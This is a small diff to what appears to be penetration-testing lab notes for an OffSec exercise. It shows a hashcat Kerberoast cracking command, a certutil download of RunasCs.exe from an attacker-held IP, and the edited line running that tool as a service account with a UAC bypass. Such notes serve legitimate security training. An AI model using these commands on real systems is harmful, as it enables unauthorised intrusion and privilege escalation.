@@ -979,7 +979,7 @@ hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
 
 # RunasCs.exe
 certutil -urlcache -split -f http://192.168.45.192/RunasCs.exe
-.\RunasCs.exe svc_mssql trustno1 cmd -d access.offsec --bypass-uac
+.\RunasCs.exe svc_mssql trustno1 cmd -d access.offsec --bypass-uac --logon-type 8
 
 
 ```
